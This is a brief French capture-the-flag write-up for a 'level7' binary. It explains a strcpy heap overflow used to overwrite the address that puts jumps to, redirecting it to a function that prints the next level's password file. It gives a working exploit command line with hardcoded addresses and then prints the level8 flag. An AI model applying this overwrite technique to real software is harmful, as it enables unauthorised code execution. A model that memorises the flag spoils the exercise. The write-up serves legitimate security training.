## GET Flag

Ce niveau utilise lui aussi strcpy.

Il est possible de remplacer l'adresse de la chaîne de caractère de la seconde structure grâce au premier strcpy.
On peut ainsi la remplacer par l'adresse de la variable globale que va utiliser puts pour jump de ce fait avec le second strcpy il est possible de remplacer cette variable par l'adresse de la fonction `m`.
La fonction `m` va afficher le contenu de `/home/user/level8/.pass`.

```
./level7 $(python -c 'print 20 * "A" + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

Il est aussi possible d'effectuer un jump vers un shellcode.

### Flag

```
level8
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```
